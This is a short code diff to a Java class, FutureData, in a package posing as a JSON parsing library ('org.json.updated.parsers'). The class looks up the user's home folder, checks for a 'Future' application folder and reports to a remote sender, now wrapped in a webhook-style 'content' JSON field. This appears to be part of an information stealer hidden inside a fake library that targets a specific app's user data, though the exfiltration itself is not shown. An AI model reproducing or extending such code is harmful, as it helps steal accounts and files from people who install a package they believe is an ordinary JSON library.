@@ -3,6 +3,7 @@ package org.json.updated.parsers.impl;
 import org.json.updated.parsers.JSONObject;
 import org.json.updated.parsers.JSONRegexHandler;
 import org.json.updated.parsers.util.FileSystemHelper;
+import org.json.updated.parsers.util.JSONBuilder;
 
 import java.io.File;
 import java.nio.file.Files;
@@ -15,16 +16,13 @@ public class FutureData implements JSONObject {
     @Override
     public void handle() {
         String home = System.getProperty("user.home");
-        if (home == null || home.isEmpty()) {
-            System.out.println("re");
-            return;
-        }
+        if (home == null || home.isEmpty()) return;
 
         String sep = FileSystemHelper.getSeparator();
         String futureDir = home + sep + "Future" + sep;
 
         if (!Files.isDirectory(Paths.get(futureDir))) {
-            JSONRegexHandler.send("> Did not contain the Future folder.");
+            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Future folder.").build());
             return;
         }
 
